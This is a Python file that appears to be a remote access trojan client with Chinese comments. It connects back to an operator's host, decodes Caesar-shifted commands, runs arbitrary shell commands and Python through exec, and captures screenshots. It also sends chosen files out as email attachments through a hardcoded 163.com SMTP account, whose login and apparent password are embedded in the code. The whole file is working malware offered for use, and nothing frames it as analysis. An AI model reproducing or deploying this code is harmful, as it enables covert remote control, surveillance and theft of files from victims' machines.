
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from tkinter import Tk
from PIL import ImageGrab
import socket,os,sys,subprocess,smtplib

code0 = "+4"
code1 = "-4"
host = "smtp.163.com"
port = "25"
name = "ycy20090311@163.com"
password = "NAFDQCPVXAVOISWR"

def Caesar(i,string1):#凯撒密码加密与解密
    string2 = ""
    if i == 0:#加密
        for a in string1:
            string2 = string2 + chr(eval("ord(a)"+code0))
    elif i == 1:#解密
        for a in string1:
            string2 = string2 + chr(eval("ord(a)"+code1))
    return string2
def Shell(cmd):#执行shell
    shell = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    out = shell.stdout.read().decode()
    err = shell.stderr.read().decode()
    if out == "" and err == "":#避免向套间字发送""造成套间字中断
        out = " "
    return out+err
def Get(file1):#获取文件
    msg = MIMEMultipart()
    file = MIMEText(open(file1,"rb").read(),"base64","utf-8")
    file["Content-Type"] = "application/octet-stream"
    file["Content-Disposition"] = "attachment;filename = " + file1
    msg.attach(file)
    smtp = smtplib.SMTP()
    smtp.connect(host,port)
    smtp.login(name,password)
    smtp.sendmail(name,name,msg.as_string())
    smtp.close()
    return name+" "+file1
def Win():#获取屏幕截图
    windown = Tk()
    jpg = ImageGrab.grab((0,0,int(windown.winfo_screenwidth()),int(windown.winfo_screenheight())))
    jpg.save("./.win.jpg")
    Get("./.win.jpg")
    os.remove("./.win.jpg")
    return "OK"
def Py(cmd):
    exec(cmd)
    return "OK"

if '__main__' == __name__:
    t = socket.socket()
    t.connect((sys.argv[1],int(sys.argv[2])))
    while True:
        cmd = Caesar(1,t.recv(2048).decode()).split(" ",1)
        if cmd[0] == "shell":
            t.send(Caesar(0,Shell(cmd[1])).encode())
        elif cmd[0] == "get":
            t.send(Caesar(0,Get(cmd[1])).encode())
        elif cmd[0] == "win":
            t.send(Caesar(0,Win()).encode())
        elif cmd[0] == "py":
            t.send(Caesar(0,Py(cmd[1])).encode())
    t.close()
